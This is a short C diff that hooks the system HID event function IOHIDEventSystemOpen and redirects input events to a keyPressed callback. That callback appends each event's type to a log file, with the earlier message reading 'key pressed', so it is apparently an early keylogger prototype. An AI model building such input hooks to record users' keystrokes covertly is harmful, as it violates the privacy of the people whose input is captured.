@@ -28,7 +28,7 @@ void keyPressed(void *target, void *refcon, void *service, void *event)
 {
     int tipo = IOHIDEventGetType(event);
     FILE *f = fopen("/cores/log_hidd.txt", "a");
-    fprintf(f, "Tecla pressionada %s\n", IOHIDEventGetTypeString(tipo));
+    fprintf(f, "Tipo evento %s\n", IOHIDEventGetTypeString(tipo));
 
     fclose(f);
 }
@@ -67,14 +67,8 @@ Boolean IOHIDEventSystemOpen(void *system, void *callback, void *target, void *r
     FILE *f = fopen("/cores/log_hidd.txt", "a");
     fprintf(f, "chegou no hook\n");
 
-    bool temp = IOHIDEventSystemOpen_ptr(system, HIDSystemCallback, target, refcon, unused);
+    bool temp = IOHIDEventSystemOpen_ptr(system, keyPressed, target, refcon, unused);
     fprintf(f, "Temp %d\n", temp);
-    fflush(f);
-    void *cliente = IOHIDEventSystemClientCreate(NULL);
-    fprintf(f, "Cliente 0x%x\n", cliente);
-    // if (cliente != NULL)
-    //     IOHIDEventSystemClientRegisterEventCallback(cliente, keyPressed, NULL, NULL);
-
     fclose(f);
 
     return temp;
